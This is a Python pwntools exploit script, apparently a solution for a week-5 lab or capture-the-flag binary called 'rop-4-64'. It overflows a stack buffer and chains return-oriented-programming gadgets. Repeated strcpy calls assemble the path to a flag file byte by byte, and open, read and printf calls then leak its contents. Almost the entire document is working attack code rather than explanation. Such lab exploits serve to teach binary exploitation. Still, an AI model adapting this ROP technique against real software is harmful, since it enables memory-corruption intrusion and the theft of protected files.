#!/usr/bin/env python

from pwn import *
import os

p = process('./rop-4-64')


#addr of /: 0x400908
#addr of string: 0x400890 "the quick..."
#addr of dest: 0x601800
#addr of string2: 0x4008c0 "I also put this for you: 123456789-"


buf = "A" * 0x80 + "BBBBBBBB"

"""
0x00000000004005a0  printf@plt
0x00000000004005b0  read@plt
0x00000000004005c0  prctl@plt
0x00000000004005d0  open@plt
0x00000000004006e2  strcpy
"""
strcpy_ = p64(0x4006e2)
read_ = p64(0x4005b0)
open_ = p64(0x4005d0)
printf_ = p64(0x4005a0)


"""
0x0000000000400863 : pop rdi ; ret
0x000000000040073f : pop rdx ; nop ; pop rbp ; ret
0x0000000000400861 : pop rsi ; pop r15 ; ret

"""

pop_rdi_ret = p64(0x400863)
pop_rsi_pop_ret = p64(0x400861)
pop_rdx_pop_ret = p64(0x40073f)


#/
buf += pop_rdi_ret
buf += p64(0x601800)
buf += pop_rsi_pop_ret
buf += p64(0x400908) + p64(0x400908)
buf += strcpy_

#/h
buf += pop_rdi_ret
buf += p64(0x601801)
buf += pop_rsi_pop_ret
buf += p64(0x400891) + p64(0x400891)
buf += strcpy_

#/ho
buf += pop_rdi_ret
buf += p64(0x601802)
buf += pop_rsi_pop_ret
buf += p64(0x4008a1) + p64(0x4008a1)
buf += strcpy_

#/hom
buf += pop_rdi_ret
buf += p64(0x601803)
buf += pop_rsi_pop_ret
buf += p64(0x4008a6) + p64(0x4008a6)
buf += strcpy_

#/home
buf += pop_rdi_ret
buf += p64(0x601804)
buf += pop_rsi_pop_ret
buf += p64(0x400892) + p64(0x400892)
buf += strcpy_

#/home/
buf += pop_rdi_ret
buf += p64(0x601805)
buf += pop_rsi_pop_ret
buf += p64(0x400908) + p64(0x400908)
buf += strcpy_

#/home/la
buf += pop_rdi_ret
buf += p64(0x601806)
buf += pop_rsi_pop_ret
buf += p64(0x4008b3) + p64(0x4008b3)
buf += strcpy_

#/home/lab
buf += pop_rdi_ret
buf += p64(0x601808)
buf += pop_rsi_pop_ret
buf += p64(0x40089a) + p64(0x40089a)
buf += strcpy_

#/home/labs
buf += pop_rdi_ret
buf += p64(0x601809)
buf += pop_rsi_pop_ret
buf += p64(0x4008a8) + p64(0x4008a8)
buf += strcpy_

#/home/labs/
buf += pop_rdi_ret
buf += p64(0x60180a)
buf += pop_rsi_pop_ret
buf += p64(0x400908) + p64(0x400908)
buf += strcpy_

#/home/labs/w
buf += pop_rdi_ret
buf += p64(0x60180b)
buf += pop_rsi_pop_ret
buf += p64(0x40089d) + p64(0x40089d)
buf += strcpy_

#/home/labs/we
buf += pop_rdi_ret
buf += p64(0x60180c)
buf += pop_rsi_pop_ret
buf += p64(0x400892) + p64(0x400892)
buf += strcpy_

#/home/labs/wee
buf += pop_rdi_ret
buf += p64(0x60180d)
buf += pop_rsi_pop_ret
buf += p64(0x400892) + p64(0x400892)
buf += strcpy_

#/home/labs/week
buf += pop_rdi_ret
buf += p64(0x60180e)
buf += pop_rsi_pop_ret
buf += p64(0x400898) + p64(0x400898)
buf += strcpy_

#/home/labs/week5
buf += pop_rdi_ret
buf += p64(0x60180f)
buf += pop_rsi_pop_ret
buf += p64(0x4008dd) + p64(0x4008dd)
buf += strcpy_

#/home/labs/week5/
buf += pop_rdi_ret
buf += p64(0x601810)
buf += pop_rsi_pop_ret
buf += p64(0x400908) + p64(0x400908)
buf += strcpy_

#/home/labs/week5/ro
buf += pop_rdi_ret
buf += p64(0x601811)
buf += pop_rsi_pop_ret
buf += p64(0x40089b) + p64(0x40089b)
buf += strcpy_

#/home/labs/week5/rop
buf += pop_rdi_ret
buf += p64(0x601813)
buf += pop_rsi_pop_ret
buf += p64(0x4008a7) + p64(0x4008a7)
buf += strcpy_

#/home/labs/week5/rop-
buf += pop_rdi_ret
buf += p64(0x601814)
buf += pop_rsi_pop_ret
buf += p64(0x4008e3) + p64(0x4008e3)
buf += strcpy_

#/home/labs/week5/rop-4
buf += pop_rdi_ret
buf += p64(0x601815)
buf += pop_rsi_pop_ret
buf += p64(0x4008dc) + p64(0x4008dc)
buf += strcpy_

#/home/labs/week5/rop-4-
buf += pop_rdi_ret
buf += p64(0x601816)
buf += pop_rsi_pop_ret
buf += p64(0x4008e3) + p64(0x4008e3)
buf += strcpy_

#/home/labs/week5/rop-4-6
buf += pop_rdi_ret
buf += p64(0x601817)
buf += pop_rsi_pop_ret
buf += p64(0x4008de) + p64(0x4008de)
buf += strcpy_

#/home/labs/week5/rop-4-64
buf += pop_rdi_ret
buf += p64(0x601818)
buf += pop_rsi_pop_ret
buf += p64(0x4008dc) + p64(0x4008dc)
buf += strcpy_

#/home/labs/week5/rop-4-64/
buf += pop_rdi_ret
buf += p64(0x601819)
buf += pop_rsi_pop_ret
buf += p64(0x400908) + p64(0x400908)
buf += strcpy_

#/home/labs/week5/rop-4-64/f
buf += pop_rdi_ret
buf += p64(0x60181a)
buf += pop_rsi_pop_ret
buf += p64(0x4008a0) + p64(0x4008a0)
buf += strcpy_

#/home/labs/week5/rop-4-64/fla
buf += pop_rdi_ret
buf += p64(0x60181b)
buf += pop_rsi_pop_ret
buf += p64(0x4008b3) + p64(0x4008b3)
buf += strcpy_

#/home/labs/week5/rop-4-64/flag
buf += pop_rdi_ret
buf += p64(0x60181d)
buf += pop_rsi_pop_ret
buf += p64(0x4008ba) + p64(0x4008ba)
buf += strcpy_

#/home/labs/week5/rop-4-64/flag\0
buf += pop_rdi_ret
buf += p64(0x60181e)
buf += pop_rsi_pop_ret
buf += p64(0x4008bd) + p64(0x4008bd)
buf += strcpy_


buf += pop_rdi_ret
buf += p64(0x601800)
buf += pop_rsi_pop_ret
buf += p64(0) + p64(0)
buf += open_

buf += pop_rdi_ret
buf += p64(3)
buf += pop_rsi_pop_ret
buf += p64(0x601a00) + p64(0x601a00)
buf += pop_rdx_pop_ret
buf += p64(100) + p64(100)
buf += read_

buf += pop_rdi_ret
buf += p64(0x601a00)
buf += printf_


#main, for testing
#buf += p64(0x4007a0)

with open("e.txt", "w") as f:
    f.write(buf)
    f.close

p.sendline(buf)
p.interactive()
